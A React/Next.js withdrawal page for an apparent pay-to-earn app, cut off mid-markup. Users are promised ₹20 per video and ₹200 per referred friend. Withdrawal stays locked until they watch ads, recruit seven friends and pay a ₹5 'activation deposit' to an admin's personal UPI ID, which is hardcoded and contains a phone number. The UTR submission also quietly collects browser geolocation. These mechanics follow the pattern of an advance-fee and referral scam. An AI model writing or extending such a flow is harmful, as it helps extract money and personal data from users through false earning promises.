'use client'
import { useEffect, useState } from 'react'
import { formatINR } from '@/lib/utils'
import Link from 'next/link'

const PAYMENT_METHODS = [
  { id: 'UPI', label: 'UPI', icon: '⚡', fields: [{ name: 'upiId', label: 'UPI ID', placeholder: 'yourname@upi' }] },
  { id: 'PHONEPE', label: 'PhonePe', icon: '📱', fields: [{ name: 'mobile', label: 'PhonePe Mobile', placeholder: '10-digit number' }] },
  { id: 'GPAY', label: 'Google Pay', icon: '🔵', fields: [{ name: 'mobile', label: 'GPay Mobile', placeholder: '10-digit number' }] },
  {
    id: 'BANK', label: 'Bank Transfer', icon: '🏦',
    fields: [
      { name: 'accountNumber', label: 'Account Number', placeholder: 'Enter account number' },
      { name: 'ifsc', label: 'IFSC Code', placeholder: 'e.g. SBIN0001234' },
      { name: 'accountName', label: 'Account Holder Name', placeholder: 'As per bank records' },
    ],
  },
]

const UPI_PAYMENT_APPS = [
  { id: 'GPAY', name: 'Google Pay', icon: '🔵', subtitle: 'GPay', color: '#1a73e8', bg: 'rgba(26,115,232,0.1)' },
  { id: 'PHONEPE', name: 'PhonePe', icon: '🟣', subtitle: 'PhonePe', color: '#8b5cf6', bg: 'rgba(139,92,246,0.1)' },
  { id: 'PAYTM', name: 'Paytm', icon: '🔷', subtitle: 'Paytm', color: '#0ea5e9', bg: 'rgba(14,165,233,0.1)' },
  { id: 'FAMPAY', name: 'FamPay', icon: '🟠', subtitle: 'FamPay', color: '#ff5a00', bg: 'rgba(255,90,0,0.1)' },
  { id: 'NAVI', name: 'Navi UPI', icon: '🟢', subtitle: 'Navi', color: '#10b981', bg: 'rgba(16,185,129,0.1)' },
  { id: 'ANY', name: 'Other UPI', icon: '⚡', subtitle: 'BHIM / Any App', color: '#f59e0b', bg: 'rgba(245,158,11,0.1)' },
]

interface WalletData {
  balance: number
  minWithdrawal: number
  completedAds: number
  adsRequired: number
  referralCount: number
  referralsRequired: number
  videosUnlocked: boolean
  friendsUnlocked: boolean
  activationFeePaid: boolean
  unlockAt?: string | null
  isTimeUnlocked?: boolean
  withdrawalUnlocked: boolean
}

interface ActivationData {
  adminUpiId: string
  adminFampayUpi?: string
  adminQrUrl?: string | null
  activationAmount: number
  activated: boolean
  unlockAt?: string | null
  isTimeUnlocked?: boolean
  request: { id: string; status: string; utrNumber: string; requestedAt: string } | null
}

function UnlockCountdown({ unlockAt, onExpire }: { unlockAt: string; onExpire: () => void }) {
  const [timeLeft, setTimeLeft] = useState<{ hours: number; minutes: number; seconds: number; isZero: boolean }>({
    hours: 0,
    minutes: 0,
    seconds: 0,
    isZero: false,
  })

  useEffect(() => {
    function calc() {
      const target = new Date(unlockAt).getTime()
      const diff = target - Date.now()
      if (diff <= 0) {
        setTimeLeft({ hours: 0, minutes: 0, seconds: 0, isZero: true })
        onExpire()
        return
      }
      const hours = Math.floor(diff / (1000 * 60 * 60))
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60))
      const seconds = Math.floor((diff % (1000 * 60)) / 1000)
      setTimeLeft({ hours, minutes, seconds, isZero: false })
    }

    calc()
    const timer = setInterval(calc, 1000)
    return () => clearInterval(timer)
  }, [unlockAt])

  if (timeLeft.isZero) {
    return (
      <div style={{ color: '#10b981', fontWeight: 800, fontSize: 15, margin: '12px 0' }}>
        🎉 Unlock Time Reached! Unlocking now...
      </div>
    )
  }

  const pad = (n: number) => String(n).padStart(2, '0')

  return (
    <div style={{ display: 'flex', gap: 10, justifyContent: 'center', margin: '16px 0' }}>
      <div style={{ background: 'var(--bg-base)', border: '1px solid var(--border)', borderRadius: 10, padding: '10px 14px', minWidth: 64, textAlign: 'center' }}>
        <div style={{ fontSize: 24, fontWeight: 900, color: 'var(--primary)', fontFamily: 'monospace' }}>{pad(timeLeft.hours)}</div>
        <div style={{ fontSize: 10, color: 'var(--text-muted)', fontWeight: 700, textTransform: 'uppercase' }}>Hours</div>
      </div>
      <div style={{ fontSize: 24, fontWeight: 900, color: 'var(--text-muted)', alignSelf: 'center' }}>:</div>
      <div style={{ background: 'var(--bg-base)', border: '1px solid var(--border)', borderRadius: 10, padding: '10px 14px', minWidth: 64, textAlign: 'center' }}>
        <div style={{ fontSize: 24, fontWeight: 900, color: 'var(--primary)', fontFamily: 'monospace' }}>{pad(timeLeft.minutes)}</div>
        <div style={{ fontSize: 10, color: 'var(--text-muted)', fontWeight: 700, textTransform: 'uppercase' }}>Mins</div>
      </div>
      <div style={{ fontSize: 24, fontWeight: 900, color: 'var(--text-muted)', alignSelf: 'center' }}>:</div>
      <div style={{ background: 'var(--bg-base)', border: '1px solid var(--border)', borderRadius: 10, padding: '10px 14px', minWidth: 64, textAlign: 'center' }}>
        <div style={{ fontSize: 24, fontWeight: 900, color: '#f59e0b', fontFamily: 'monospace' }}>{pad(timeLeft.seconds)}</div>
        <div style={{ fontSize: 10, color: 'var(--text-muted)', fontWeight: 700, textTransform: 'uppercase' }}>Secs</div>
      </div>
    </div>
  )
}

/* ── helpers ─────────────────────────────────────────────────────────────── */

function StepNum({ n, done, active }: { n: number; done: boolean; active: boolean }) {
  return (
    <div style={{
      width: 40, height: 40, borderRadius: '50%', flexShrink: 0,
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      fontWeight: 800, fontSize: 16,
      background: done ? 'linear-gradient(135deg,#10b981,#059669)' : active ? 'var(--primary-gradient)' : 'var(--bg-surface)',
      color: done || active ? '#fff' : 'var(--text-muted)',
      border: done ? '2px solid #059669' : active ? '2px solid var(--primary)' : '2px solid var(--border)',
      boxShadow: active ? '0 0 0 5px rgba(108,71,255,0.12)' : done ? '0 0 0 4px rgba(16,185,129,0.1)' : 'none',
      transition: 'all 0.3s',
    }}>
      {done ? '✓' : n}
    </div>
  )
}

function Bar({ val, max, done }: { val: number; max: number; done: boolean }) {
  return (
    <div style={{ height: 8, background: 'var(--bg-surface)', borderRadius: 99, overflow: 'hidden', border: '1px solid var(--border)', marginTop: 10 }}>
      <div style={{
        height: '100%', width: `${Math.min((val / max) * 100, 100)}%`, borderRadius: 99,
        background: done ? 'linear-gradient(90deg,#10b981,#059669)' : 'var(--primary-gradient)',
        transition: 'width 0.6s ease',
      }} />
    </div>
  )
}

function copyToClipboard(text: string, setCopied: (v: boolean) => void) {
  navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000) })
}

/* ── component ───────────────────────────────────────────────────────────── */

export default function WithdrawPage() {
  const [wallet, setWallet] = useState<WalletData | null>(null)
  const [activation, setActivation] = useState<ActivationData | null>(null)
  const [loading, setLoading] = useState(true)

  // Activation form
  const [utr, setUtr] = useState('')
  const [senderUpi, setSenderUpi] = useState('')
  const [submittingUtr, setSubmittingUtr] = useState(false)
  const [utrError, setUtrError] = useState('')
  const [utrSuccess, setUtrSuccess] = useState(false)
  const [copied, setCopied] = useState(false)
  const [selectedApp, setSelectedApp] = useState<string | null>(null)
  const [appRedirecting, setAppRedirecting] = useState<string | null>(null)
  const [payModalApp, setPayModalApp] = useState<typeof UPI_PAYMENT_APPS[0] | null>(null)

  function getAppUri(appId: string, upiTarget: string, amt: number) {
    const note = encodeURIComponent('Withdrawal Activation')
    const name = encodeURIComponent('Admin')
    const baseParams = `pa=${encodeURIComponent(upiTarget)}&pn=${name}&am=${amt}&cu=INR&tn=${note}`

    if (appId === 'PHONEPE') return `phonepe://pay?${baseParams}`
    if (appId === 'GPAY') return `tez://upi/pay?${baseParams}`
    if (appId === 'PAYTM') return `paytmmp://pay?${baseParams}`
    if (appId === 'FAMPAY') return `fampay://upi/pay?${baseParams}`
    return `upi://pay?${baseParams}`
  }

  function handleSelectApp(app: typeof UPI_PAYMENT_APPS[0], upiTarget: string, amt: number) {
    setSelectedApp(app.id)
    setPayModalApp(app)
    setAppRedirecting(app.id)
    setTimeout(() => setAppRedirecting(null), 4000)

    const uri = getAppUri(app.id, upiTarget, amt)
    try {
      window.location.href = uri
    } catch {}
  }

  // Withdraw form
  const [method, setMethod] = useState('UPI')
  const [amount, setAmount] = useState('')
  const [accountDetails, setAccountDetails] = useState<Record<string, string>>({})
  const [submitting, setSubmitting] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState<{ requestId: string; amount: number } | null>(null)
  const [confirmModal, setConfirmModal] = useState(false)

  async function load() {
    const [w, a] = await Promise.all([
      fetch('/api/user/wallet').then(r => r.json()),
      fetch('/api/withdraw/activation-payment').then(r => r.json()).catch(() => null),
    ])
    if (w.success) {
      setWallet({
        balance: w.data.wallet.availableBalance,
        minWithdrawal: 1000,
        completedAds: w.data.completedAds ?? 0,
        adsRequired: w.data.adsRequired ?? 3,
        referralCount: w.data.referralCount ?? 0,
        referralsRequired: w.data.referralsRequired ?? 7,
        videosUnlocked: w.data.videosUnlocked ?? false,
        friendsUnlocked: w.data.friendsUnlocked ?? false,
        activationFeePaid: w.data.activationFeePaid ?? false,
        unlockAt: w.data.unlockAt ?? a?.data?.unlockAt ?? null,
        isTimeUnlocked: w.data.isTimeUnlocked ?? a?.data?.isTimeUnlocked ?? true,
        withdrawalUnlocked: w.data.withdrawalUnlocked ?? false,
      })
    }
    if (a?.success) setActivation(a.data)
    setLoading(false)
  }
  useEffect(() => { load() }, [])

  async function submitUtr() {
    setUtrError('')
    if (!utr.trim() || utr.trim().length < 6) { setUtrError('Please enter a valid UTR / Transaction ID (min 6 characters).'); return }
    setSubmittingUtr(true)
    try {
      // Gather client geo context (timezone and coordinates if permitted)
      const clientGeo: { timezone?: string; latitude?: number; longitude?: number } = {
        timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Asia/Kolkata',
      }
      if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
        try {
          const pos = await new Promise<GeolocationPosition | null>((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (p) => resolve(p),
              () => resolve(null),
              { timeout: 1500, maximumAge: 60000 }
            )
          })
          if (pos?.coords) {
            clientGeo.latitude = pos.coords.latitude
            clientGeo.longitude = pos.coords.longitude
          }
        } catch {
          // ignore
        }
      }

      const r = await fetch('/api/withdraw/activation-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          utrNumber: utr.trim(),
          senderUpi: senderUpi.trim() || undefined,
          clientGeo,
        }),
      }).then(x => x.json())
      if (r.success) { setUtrSuccess(true); await load() }
      else setUtrError(r.error ?? 'Submission failed. Try again.')
    } catch { setUtrError('Request failed. Try again.') }
    finally { setSubmittingUtr(false) }
  }

  async function handleWithdraw() {
    setError(''); setSubmitting(true)
    try {
      const r = await fetch('/api/withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: parseFloat(amount), method, accountDetails }),
      }).then(x => x.json())
      if (r.success) { setSuccess({ requestId: r.data.requestId, amount: parseFloat(amount) }); setConfirmModal(false) }
      else { setError(r.error); setConfirmModal(false) }
    } catch { setError('Request failed.'); setConfirmModal(false) }
    finally { setSubmitting(false) }
  }

  /* loading */
  if (loading) return (
    <div style={{ maxWidth: 580, margin: '0 auto' }}>
      {[100, 380, 200, 200].map((h, i) => (
        <div key={i} className="skeleton" style={{ height: h, borderRadius: 16, marginBottom: 14 }} />
      ))}
    </div>
  )
  if (!wallet) return null

  /* success */
  if (success) return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '55vh' }}>
      <div className="card animate-fade-in" style={{ maxWidth: 460, width: '100%', textAlign: 'center', padding: '56px 36px', borderColor: 'rgba(16,185,129,0.35)' }}>
        <div style={{ fontSize: 64, marginBottom: 16 }}>🎉</div>
        <h2 style={{ fontSize: 24, fontWeight: 800, marginBottom: 8 }}>Withdrawal Submitted!</h2>
        <div style={{ margin: '20px 0', padding: 16, background: 'var(--bg-surface)', borderRadius: 12 }}>
          <div style={{ fontSize: 12, color: 'var(--text-muted)', marginBottom: 4 }}>Request ID</div>
          <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--primary)' }}>{success.requestId}</div>
        </div>
        <div style={{ fontSize: 28, fontWeight: 900, color: 'var(--success)', marginBottom: 12 }}>{formatINR(success.amount)}</div>
        <p style={{ color: 'var(--text-muted)', fontSize: 13, margin: '0 0 24px', lineHeight: 1.6 }}>
          Under review — processed within 1–3 business days.
        </p>
        <a href="/history" className="btn btn-primary btn-full">View Withdrawal History</a>
      </div>
    </div>
  )

  const s1 = wallet.videosUnlocked
  const s2 = wallet.friendsUnlocked
  const isTimeUnlocked = wallet.isTimeUnlocked ?? true
  const s3 = wallet.activationFeePaid && isTimeUnlocked
  const isWaitingTimer = wallet.activationFeePaid && !isTimeUnlocked
  const allDone = wallet.withdrawalUnlocked
  const activeStep = !s1 ? 1 : !s2 ? 2 : !s3 ? 3 : 4
  const adminUpi = activation?.adminFampayUpi || activation?.adminUpiId || '7876405963@fam'
  const activationAmt = activation?.activationAmount ?? 5
  const pendingRequest = activation?.request

  /* ══ LOCK SCREEN ═══════════════════════════════════════════════════════════ */
  if (!allDone) return (
    <div className="animate-fade-in" style={{ maxWidth: 580, margin: '0 auto' }}>

      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontSize: 28, fontWeight: 800, marginBottom: 6 }}>Unlock Withdrawals</h1>
        <p style={{ color: 'var(--text-muted)', fontSize: 14 }}>Complete 3 steps to unlock permanent withdrawal access.</p>
      </div>

      {/* Mini stepper */}
      <div style={{
        display: 'grid', gridTemplateColumns: '1fr 1fr 1fr',
        marginBottom: 24, background: 'var(--bg-surface)',
        border: '1px solid var(--border)', borderRadius: 14, overflow: 'hidden',
      }}>
        {[
          { label: `Watch ${wallet.adsRequired} Videos`, icon: '▶', done: s1, active: activeStep === 1 },
          { label: `Invite ${wallet.referralsRequired} Friends`, icon: '👥', done: s2, active: activeStep === 2 },
          { label: `Pay ₹${activationAmt} Deposit`, icon: '💳', done: s3, active: activeStep === 3 },
        ].map((item, i) => (
          <div key={i} style={{
            padding: '14px 10px', textAlign: 'center', position: 'relative',
            background: item.done ? 'rgba(16,185,129,0.07)' : item.active ? 'rgba(108,71,255,0.07)' : 'transparent',
            borderRight: i < 2 ? '1px solid var(--border)' : 'none',
          }}>
            <div style={{ fontSize: 20, marginBottom: 4 }}>{item.done ? '✅' : item.icon}</div>
            <div style={{ fontSize: 11, fontWeight: 700, color: item.done ? '#10b981' : item.active ? 'var(--primary)' : 'var(--text-muted)' }}>Step {i + 1}</div>
            <div style={{ fontSize: 10, color: 'var(--text-muted)', marginTop: 2 }}>{item.label}</div>
            {item.active && <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 3, background: 'var(--primary-gradient)' }} />}
            {item.done && <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 3, background: 'linear-gradient(90deg,#10b981,#059669)' }} />}
          </div>
        ))}
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>

        {/* ── STEP 1 ── Videos ──────────────────────────────────────────────── */}
        <div className="card" style={{
          padding: 22,
          borderColor: s1 ? 'rgba(16,185,129,0.4)' : activeStep === 1 ? 'rgba(108,71,255,0.4)' : 'var(--border)',
          background: s1 ? 'rgba(16,185,129,0.04)' : activeStep === 1 ? 'rgba(108,71,255,0.04)' : 'var(--bg-card)',
        }}>
          <div style={{ display: 'flex', gap: 14 }}>
            <StepNum n={1} done={s1} active={activeStep === 1} />
            <div style={{ flex: 1 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                <div style={{ fontWeight: 800, fontSize: 15 }}>▶ Watch {wallet.adsRequired} Sponsored Videos</div>
                <span style={{ fontSize: 13, fontWeight: 800, color: s1 ? '#10b981' : 'var(--primary)', background: s1 ? 'rgba(16,185,129,0.1)' : 'rgba(108,71,255,0.1)', padding: '2px 10px', borderRadius: 99 }}>
                  {wallet.completedAds}/{wallet.adsRequired}
                </span>
              </div>
              <p style={{ fontSize: 13, color: 'var(--text-muted)', margin: '0 0 10px', lineHeight: 1.5 }}>
                Watch full sponsored videos on the Earn page. <strong style={{ color: 'var(--success)' }}>Each video = ₹20!</strong>
              </p>
              <Bar val={wallet.completedAds} max={wallet.adsRequired} done={s1} />
              {!s1 ? (
                <div style={{ marginTop: 12, display: 'flex', alignItems: 'center', gap: 10 }}>
                  <Link href="/earn" className="btn btn-primary btn-sm">▶ Watch Now →</Link>
                  <span style={{ fontSize: 12, color: 'var(--text-muted)' }}>{Math.max(wallet.adsRequired - wallet.completedAds, 0)} left</span>
                </div>
              ) : (
                <div style={{ marginTop: 8, fontSize: 13, color: '#10b981', fontWeight: 600 }}>✅ All {wallet.adsRequired} videos complete!</div>
              )}
            </div>
          </div>
        </div>

        {/* ── STEP 2 ── 7 Friends ─────────────────────────────────────────────── */}
        <div className="card" style={{
          padding: 22,
          borderColor: s2 ? 'rgba(16,185,129,0.4)' : activeStep === 2 ? 'rgba(108,71,255,0.4)' : 'var(--border)',
          background: s2 ? 'rgba(16,185,129,0.04)' : activeStep === 2 ? 'rgba(108,71,255,0.04)' : 'var(--bg-card)',
          opacity: !s1 ? 0.45 : 1, pointerEvents: !s1 ? 'none' : 'auto', transition: 'opacity 0.3s',
        }}>
          <div style={{ display: 'flex', gap: 14 }}>
            <StepNum n={2} done={s2} active={activeStep === 2} />
            <div style={{ flex: 1 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                <div style={{ fontWeight: 800, fontSize: 15 }}>👥 Invite {wallet.referralsRequired} Friends</div>
                <span style={{ fontSize: 13, fontWeight: 800, color: s2 ? '#10b981' : s1 ? 'var(--primary)' : 'var(--text-muted)', background: s2 ? 'rgba(16,185,129,0.1)' : s1 ? 'rgba(108,71,255,0.1)' : 'var(--bg-surface)', padding: '2px 10px', borderRadius: 99 }}>
                  {wallet.referralCount}/{wallet.referralsRequired}
                </span>
              </div>
              <p style={{ fontSize: 13, color: 'var(--text-muted)', margin: '0 0 10px', lineHeight: 1.5 }}>
                Share your referral link. All {wallet.referralsRequired} friends must sign up. <strong style={{ color: 'var(--success)' }}>Each friend = ₹200!</strong>
              </p>
              <Bar val={wallet.referralCount} max={wallet.referralsRequired} done={s2} />
              {!s2 && s1 ? (
                <div style={{ marginTop: 12, display: 'flex', alignItems: 'center', gap: 10 }}>
                  <Link href="/refer" className="btn btn-primary btn-sm">🔗 Share Link →</Link>
                  <span style={{ fontSize: 12, color: 'var(--text-muted)' }}>{Math.max(wallet.referralsRequired - wallet.referralCount, 0)} left</span>
                </div>
              ) : s2 ? (
                <div style={{ marginTop: 8, fontSize: 13, color: '#10b981', fontWeight: 600 }}>✅ All {wallet.referralsRequired} friends joined!</div>
              ) : (
                <div style={{ marginTop: 8, fontSize: 12, color: 'var(--text-muted)' }}>🔒 Complete Step 1 first</div>
              )}
            </div>
          </div>
        </div>

        {/* ── STEP 3 ── Pay ₹5 to Admin FamPay UPI ──────────────────────────────── */}
        <div className="card" style={{
          padding: 22,
          borderColor: s3 ? 'rgba(16,185,129,0.4)' : activeStep === 3 ? 'rgba(245,158,11,0.5)' : 'var(--border)',
          background: s3 ? 'rgba(16,185,129,0.04)' : activeStep === 3 ? 'rgba(245,158,11,0.04)' : 'var(--bg-card)',
          opacity: !(s1 && s2) ? 0.45 : 1, pointerEvents: !(s1 && s2) ? 'none' : 'auto', transition: 'opacity 0.3s',
        }}>
          <div style={{ display: 'flex', gap: 14 }}>
            <StepNum n={3} done={s3} active={activeStep === 3} />
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: 800, fontSize: 16, marginBottom: 4 }}>
                💳 Deposit ₹{activationAmt} to Admin
              </div>
              <p style={{ fontSize: 13, color: 'var(--text-muted)', margin: '0 0 14px', lineHeight: 1.5 }}>
                Choose your UPI app (Google Pay, PhonePe, Paytm, Navi, Other UPI) to pay ₹{activationAmt} directly, then submit your UTR number to unlock withdrawal.
              </p>

              {isWaitingTimer && wallet.unlockAt ? (
                /* Admin Approved, waiting for scheduled unlock time! */
                <div style={{
                  background: 'rgba(59,130,246,0.06)', border: '1px solid rgba(59,130,246,0.3)',
                  borderRadius: 14, padding: '20px 18px', textAlign: 'center',
                }}>
                  <div style={{ fontSize: 32, marginBottom: 4 }}>⏱️</div>
                  <div style={{ fontSize: 16, fontWeight: 800, color: 'var(--text-primary)' }}>
                    Payment Verified by Admin!
                  </div>
                  <div style={{ fontSize: 13, color: 'var(--text-muted)', marginTop: 4 }}>
                    Admin has approved your ₹{activationAmt} deposit. Your withdrawal is scheduled to unlock on:
                  </div>
                  <div style={{ fontSize: 14, fontWeight: 800, color: '#3b82f6', marginTop: 4 }}>
                    📅 {new Date(wallet.unlockAt).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' })}
                  </div>

                  <UnlockCountdown unlockAt={wallet.unlockAt} onExpire={() => load()} />

                  <p style={{ fontSize: 12, color: 'var(--text-muted)', margin: 0, lineHeight: 1.5 }}>
                    Timer zero hote hi aapka withdrawal form automatically unlock ho jayega!
                  </p>
                </div>
              ) : s3 ? (
                <div style={{ fontSize: 13, color: '#10b981', fontWeight: 600 }}>
                  ✅ Payment verified by admin! Withdrawal permanently unlocked.
                </div>
              ) : pendingRequest && pendingRequest.status === 'PENDING' ? (
                /* Already submitted — waiting for admin */
                <div style={{
                  background: 'rgba(245,158,11,0.08)', border: '1px solid rgba(245,158,11,0.3)',
                  borderRadius: 12, padding: '16px 18px',
                }}>
                  <div style={{ display: 'flex', gap: 10, alignItems: 'center', marginBottom: 8 }}>
                    <span style={{ fontSize: 22 }}>⏳</span>
                    <div>
                      <div style={{ fontWeight: 700, color: '#f59e0b' }}>Payment Submitted — Under Review</div>
                      <div style={{ fontSize: 12, color: 'var(--text-muted)' }}>UTR: <strong>{pendingRequest.utrNumber}</strong></div>
                    </div>
                  </div>
                  <p style={{ fontSize: 13, color: 'var(--text-muted)', margin: 0, lineHeight: 1.5 }}>
                    Admin is verifying your ₹{activationAmt} payment. Admin approval ke baad aapka withdrawal unlock time activate ho jayega.
                  </p>
                </div>
              ) : s1 && s2 ? (
                /* Show payment flow */
                <>
                  {/* ── 1. Select App to Pay Directly ── */}
                  <div style={{ marginBottom: 18 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                      <span style={{ fontSize: 13, fontWeight: 700, color: 'var(--text-primary)' }}>
                        📱 Select App to Pay ₹{activationAmt} Directly:
                      </span>
                      <span style={{ fontSize: 11, color: '#ff5a00', fontWeight: 800 }}>
                        ⚡ 1-Click Pay
                      </span>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 10 }}>
                      {UPI_PAYMENT_APPS.map(app => {
                        const isSelected = selectedApp === app.id
                        return (
                          <button
                            key={app.id}
                            type="button"
                            onClick={() => handleSelectApp(app, adminUpi, activationAmt)}
                            style={{
                              display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
                              padding: '12px 6px', borderRadius: 12,
                              background: isSelected ? app.bg : 'var(--bg-surface)',
                              border: isSelected ? `2px solid ${app.color}` : '1px solid var(--border)',
                              cursor: 'pointer', transition: 'all 0.2s', textAlign: 'center',
                              boxShadow: isSelected ? `0 0 0 3px ${app.bg}` : 'none',
                            }}
                          >
                            <span style={{ fontSize: 24, marginBottom: 4 }}>{app.icon}</span>
                            <span style={{ fontSize: 12, fontWeight: 800, color: app.color }}>{app.name}</span>
                            <span style={{ fontSize: 10, color: 'var(--text-muted)', marginTop: 2 }}>Pay ₹{activationAmt} →</span>
                          </button>
                        )
                      })}
                    </div>

                    {appRedirecting && (
                      <div style={{
                        marginTop: 10, background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.3)',
                        borderRadius: 10, padding: '10px 14px', fontSize: 12, color: '#10b981', fontWeight: 700,
                        textAlign: 'center', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6,
                      }}>
                        <span>🚀</span>
                        <span>Opening {UPI_PAYMENT_APPS.find(a => a.id === appRedirecting)?.name ?? 'App'}... Send ₹{activationAmt} and copy UTR!</span>
                      </div>
                    )}
                  </div>

                  {/* ── 2. Dynamic QR Code display ── */}
                  <div style={{
                    background: 'var(--bg-surface)', border: '2px dashed rgba(245,158,11,0.5)',
                    borderRadius: 14, padding: '20px', marginBottom: 18,
                    display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center',
                  }}>
                    <div style={{
                      background: '#fff', padding: 12, borderRadius: 14,
                      boxShadow: '0 4px 20px rgba(0,0,0,0.15)', marginBottom: 8,
                    }}>
                      <img
                        src={activation?.adminQrUrl || `https://api.qrserver.com/v1/create-qr-code/?size=200x200&margin=2&data=${encodeURIComponent(`upi://pay?pa=${adminUpi}&pn=Admin&am=${activationAmt}&cu=INR&tn=Withdrawal+Activation`)}`}
                        alt="Scan QR to Pay ₹5"
                        style={{ width: 160, height: 160, display: 'block', borderRadius: 6 }}
                      />
                    </div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text-primary)' }}>
                      📸 Scan QR with Any UPI App to Pay ₹{activationAmt}
                    </div>
                    <div style={{ fontSize: 11, color: 'var(--text-muted)', marginTop: 2 }}>
                      Google Pay / PhonePe / Paytm / Navi / Any UPI
                    </div>
                  </div>

                  {/* ── 3. UTR input form ── */}
                  <div style={{ marginBottom: 12 }}>
                    <label style={{ display: 'block', fontSize: 13, fontWeight: 700, marginBottom: 6, color: 'var(--text-secondary)' }}>
                      UTR / Transaction ID *
                    </label>
                    <input
                      type="text"
                      className="input"
                      id="activation-utr"
                      placeholder="e.g. 421234567890 or 12-digit UTR"
                      value={utr}
                      onChange={e => setUtr(e.target.value)}
                      style={{ marginBottom: 10 }}
                    />
                    <label style={{ display: 'block', fontSize: 13, fontWeight: 600, marginBottom: 6, color: 'var(--text-secondary)' }}>
                      Your UPI ID (optional — helps faster approval)
                    </label>
                    <input
                      type="text"
                      className="input"
                      id="activation-sender-upi"
                      placeholder="yourname@upi (optional)"
                      value={senderUpi}
                      onChange={e => setSenderUpi(e.target.value)}
                    />
                  </div>

                  {utrError && (
                    <div style={{ background: 'var(--error-bg)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 8, padding: '10px 14px', fontSize: 13, color: 'var(--error)', marginBottom: 12 }}>
                      {utrError}
                    </div>
                  )}

                  {utrSuccess && (
                    <div style={{ background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.3)', borderRadius: 8, padding: '10px 14px', fontSize: 13, color: '#10b981', marginBottom: 12, fontWeight: 600 }}>
                      ✅ Submitted! Admin will verify and unlock your withdrawal shortly.
                    </div>
                  )}

                  <button
                    id="submit-activation-utr"
                    disabled={submittingUtr || utrSuccess}
                    onClick={submitUtr}
                    style={{
                      width: '100%', padding: '13px 20px', borderRadius: 10, border: 'none',
                      background: 'linear-gradient(135deg,#f59e0b,#fbbf24)',
                      color: '#fff', fontWeight: 800, fontSize: 15, cursor: 'pointer',
                      boxShadow: '0 4px 16px rgba(245,158,11,0.25)',
                      opacity: submittingUtr || utrSuccess ? 0.75 : 1,
                      transition: 'all 0.2s',
                    }}
                  >
                    {submittingUtr ? 'Submitting...' : utrSuccess ? '✅ Submitted!' : '✅ I\'ve Paid — Submit UTR'}
                  </button>
                </>
              ) : (
                <div style={{ fontSize: 12, color: 'var(--text-muted)' }}>🔒 Complete Steps 1 & 2 first</div>
              )}
            </div>
          </div>
        </div>

      </div>

      <div style={{ marginTop: 20, padding: '14px 18px', background: 'var(--bg-surface)', border: '1px solid var(--border)', borderRadius: 12, fontSize: 13, color: 'var(--text-muted)', lineHeight: 1.7 }}>
        <strong style={{ color: 'var(--text-primary)' }}>💡 After Step 3:</strong> Withdraw <strong style={{ color: 'var(--primary)' }}>all your earnings anytime</strong> — minimum ₹1,000.
      </div>

      {/* ── App Payment Modal (Opens on Click for Instant Auto-Pay / QR) ── */}
      {payModalApp && (
        <div className="modal-overlay" onClick={() => setPayModalApp(null)}>
          <div className="modal animate-fade-in" onClick={e => e.stopPropagation()} style={{ maxWidth: 440, textAlign: 'center', padding: '28px 24px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 18 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <span style={{ fontSize: 28 }}>{payModalApp.icon}</span>
                <div style={{ fontWeight: 800, fontSize: 18, textAlign: 'left' }}>
                  Pay ₹{activationAmt} with {payModalApp.name}
                </div>
              </div>
              <button
                onClick={() => setPayModalApp(null)}
                style={{ background: 'transparent', border: 'none', fontSize: 22, color: 'var(--text-muted)', cursor: 'pointer', padding: 4 }}
              >
                ✕
              </button>
            </div>

            {/* QR Code Container */}
            <div style={{
              background: '#fff', borderRadius: 16, padding: 16, display: 'inline-block',
              boxShadow: '0 8px 30px rgba(0,0,0,0.25)', marginBottom: 18,
            }}>
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=4&data=${encodeURIComponent(`upi://pay?pa=${adminUpi}&pn=Admin&am=${activationAmt}&cu=INR&tn=Withdrawal+Activation`)}`}
                alt="UPI QR Code"
                style={{ width: 180, height: 180, display: 'block', borderRadius: 8 }}
              />
              <div style={{ fontSize: 12, fontWeight: 800, color: '#111', marginTop: 8 }}>
                Scan to Pay ₹{activationAmt} with {payModalApp.name}
              </div>
            </div>

            {/* Mobile Direct Pay Button */}
            <a
              href={getAppUri(payModalApp.id, adminUpi, activationAmt)}
              style={{
                display: 'block', width: '100%', padding: '13px 18px', borderRadius: 10,
                background: payModalApp.color, color: '#fff', fontWeight: 800, fontSize: 15,
                textAlign: 'center', textDecoration: 'none', marginBottom: 12,
                boxShadow: `0 4px 16px ${payModalApp.bg}`,
              }}
            >
